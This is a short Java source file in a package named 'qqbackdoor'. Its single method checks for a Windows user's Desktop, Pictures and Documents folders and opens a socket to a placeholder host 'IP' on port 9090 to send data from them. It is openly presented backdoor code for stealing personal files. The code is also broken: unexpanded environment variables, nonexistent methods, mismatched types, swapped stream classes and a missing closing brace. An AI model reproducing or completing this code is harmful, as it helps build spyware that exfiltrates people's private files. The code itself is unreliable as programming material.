package com.qqTechnologies.qqbackdoor;

// Dependencies 

public class User {
  
  public void Write() {
    File desktop = new File("%USERPROFILE%\\Desktop");
    File pictures = new File("%USERPROFILE%\\Pictures");
    File documents = new File("%USERPROFILE%\\Documents");

    if ((desktop.exists() && pictures.exists() && documents.exists()) == true) 
    {
      byte desktop_b = desktop.getAbsoluteFile().getBytes();
      byte pictures_b = pictures.getAbsoluteFile().getBytes();
      byte documents_b = documents.getAbsoluteFile().getBytes();
      Socket s = new Socket("IP", 9090);
      BufferedOutputStream b = new BufferedInputStream(s.getOutputStream());
      b.write(desktop_b);
      b.write(pictures_b);
      b.write(documents_b);
      b.close();
    s.close();
    }
  }
